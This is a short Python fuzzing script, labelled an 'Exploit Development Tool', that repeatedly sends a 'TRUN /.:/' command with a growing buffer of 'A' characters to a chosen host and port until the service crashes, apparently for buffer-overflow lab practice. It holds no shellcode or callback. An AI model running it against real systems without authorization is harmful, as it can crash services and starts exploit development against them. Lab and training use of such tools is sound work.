#!/usr/bin/python
import optparse, os, sys, socket, time

parser = optparse.OptionParser('Example: python fuzz.py -t <target host> -p <target port>')
parser.add_option('-t', dest='target', type='string', help='Enter a target host')
parser.add_option('-p', dest='port', type='int', help='Enter a target port')
(options, args) = parser.parse_args()
target = options.target
port = options.port

if (target == None) | (port == None):
	print(parser.usage)
	exit(0)

print('\n------------------------------------FUZZ----------------------------------------')
print('                            Exploit Development Tool')
print('                             Author: @rootshooter')
print('                                Version: 1.0')
print('--------------------------------------------------------------------------------')
print('[+] Let the FUZZing begin!......\n')

payload = "A" * 100 #CHANGE AS NEEDED
command = "TRUN /.:/" #CHANGE AS NEEDED

while True :
	try:
		print('[+] Sending Payload')
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target , port))
		s.send((command + payload))
		s.close()
		time.sleep(1)
		payload = payload + "A" * 100

	except:
		print('[+] Crash detected at %s bytes!' % str(len(payload)))
		sys.exit()









